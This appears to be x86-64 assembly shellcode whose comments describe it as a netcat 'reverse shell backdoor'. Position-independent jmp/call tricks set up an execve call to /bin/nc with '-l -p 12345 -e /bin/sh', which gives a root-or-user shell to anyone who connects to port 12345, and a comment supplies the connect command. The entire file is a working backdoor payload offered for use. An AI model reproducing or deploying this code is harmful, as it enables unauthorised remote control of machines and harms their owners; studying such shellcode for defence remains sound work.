SECTION .text
global main

;; Opens a netcat reverse shell backdoor
;; # nc -l -p 12345 -e /bin/sh
;; 
;; Connect with: nc 127.0.0.1 12345

main:
	jmp  @data0
@filename:
	pop  rdi
	push 0
	jmp  @data5
@argv5:
	jmp  @data4
@argv4:
	jmp  @data3
@argv3:
	jmp  @data2
@argv2:
	jmp  @data1
@argv1:
	lea  rax,[rdi+5]	;; argv[0] is the basename
	push rax
	mov  rsi, rsp       ;; argv
	xor	 rax,rax
	cdq					;; envp
	mov	 al,0x3b		;; execve
	syscall
@data0:
	call @filename
	db '/bin/nc',0		;; filename
@data1:
	call @argv1
	db '-l',0
@data2:
	call @argv2
	db '-p',0
@data3:
	call @argv3
	db '12345',0
@data4:
	call @argv4
	db '-e',0
@data5:
	call @argv5
	db '/bin/sh',0
